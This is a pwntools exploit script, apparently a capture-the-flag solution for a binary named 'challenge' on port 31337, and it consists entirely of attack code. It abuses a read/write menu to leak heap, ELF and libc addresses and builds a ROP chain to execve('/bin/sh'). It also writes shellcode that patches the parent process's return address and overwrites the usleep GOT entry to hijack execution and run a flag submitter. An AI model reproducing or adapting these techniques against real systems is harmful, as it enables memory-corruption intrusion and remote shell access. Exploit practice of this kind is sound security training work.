from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
#p = remote(HOST, int(PORT))
# elf = ELF("../handout/challenge")
elf = ELF("./challenge")

context.arch = "amd64"

def get_con():
    if not args.LOCAL:
        HOST = os.environ.get('HOST', 'localhost')
        PORT = 31337
        p = remote(HOST, PORT)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], '''
            # ---< Your gdb script here >---
            set follow-fork-mode parent
            continue
            ''', aslr=False)
        else:
            p = process([elf.path])
    return p


p = get_con()

def vm_read(addr):
    p.sendlineafter(":", b"1")
    p.sendlineafter(":", hex(addr)[2:].encode())
    p.recvuntil("Value: ")
    return int(p.recvuntil(b"\n", drop=True), 16)

def vm_write(addr, value):
    p.sendlineafter(":", b"2")
    p.sendlineafter(":", hex(value)[2:].encode())
    p.sendlineafter(":", hex(addr)[2:].encode())

# First read free pointer
ptr = vm_read(0x1234)

log.info(f"First leak : {hex(ptr)}")

# Get ELF base
val = 0
for i in range(128):
    val = vm_read(ptr + i*8)
    # print(i, hex(val))
    if val > 0x0000550000000000 and val < 0x00006f0000000000:
        if vm_read(val-0x40) == 0x00010102464c457f:
            break


elf.address = val - 0x40
log.success(f"ELF @ {elf.address:x}")

parent_ret = ptr - 0x130

log.info(f"Target parent ret @ {hex(parent_ret)}")

def add_write(target, value):
    return f"""
    // ppid in r13
    mov rdi, r13
    mov rsi, {target}
    mov rdx, {value}
    call r12
"""

libc_ret = ptr - 0x70
libc_base = vm_read(libc_ret) - 0x29e40

# libc = ELF("../handout/libc.so.6")
libc = ELF("./libc.so.6")
# TODO: find libc leak, should be in the printed vals above somewhere
libc.address = libc_base
rop = ROP(libc)

rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)
payload =  rop.chain()

pu64 = lambda x: struct.unpack("Q", x)

target = parent_ret
writev_helper = elf.address + 0x14FC
shellcode = f"""
    mov r12, {writev_helper}

    mov rax, 110
    syscall
    mov r13, rax
"""

payload += (len(payload)%8)*b"\x90"
for i in range(0, len(payload), 8):
    value = u64(payload[i:i+8])
    addr = target + i
    shellcode += add_write(addr, value)

print("Shellcode:")
print(shellcode)

payload = asm(shellcode)
payload += b"\x90"*8
payload += (8-len(payload)%8)*b"\x90"

shellcode_target = elf.address + 0x2000

log.info(f"shellcode_target: {hex(shellcode_target)}")

assert len(payload) % 8 == 0
for i in range(0, len(payload), 8):
    value = u64(payload[i:i+8])
    print(hex(value))
    vm_write(shellcode_target + i, value)

vm_write(elf.got.usleep, shellcode_target)

time.sleep(1)

p.sendline(b"3")
time.sleep(1)
p.sendline(b"./submitter")
print(p.recvuntil(b"}"))
p.close()
